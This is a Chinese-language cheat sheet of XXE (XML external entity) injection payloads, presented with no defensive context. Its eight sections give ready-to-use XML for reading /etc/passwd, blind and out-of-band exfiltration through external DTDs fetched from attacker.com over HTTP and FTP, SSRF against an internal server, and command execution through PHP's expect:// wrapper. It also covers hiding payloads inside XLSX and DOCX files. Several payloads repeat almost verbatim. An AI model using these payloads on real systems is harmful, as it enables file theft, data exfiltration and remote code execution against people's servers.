# XXE实体注入

## 1. 基础XXE攻击

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## 2. 盲注XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>
```

## 3. OOB外带攻击

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "ftp://attacker.com/xxe">
%xxe;
]>
```

## 4. 文件读取

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## 5. XXE+SSRF组合

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<foo>&xxe;</foo>
```

## 6. 外部DTD利用

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>&xxe;</foo>
```

## 7. 文件类型XXE

### XLSX文件XXE

解压xlsx文件，修改xl/workbook.xml添加XXE payload

### DOCX文件XXE

解压docx文件，修改word/document.xml添加XXE payload

## 8. XXE to RCE

### 通过PHP expect协议

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>
```
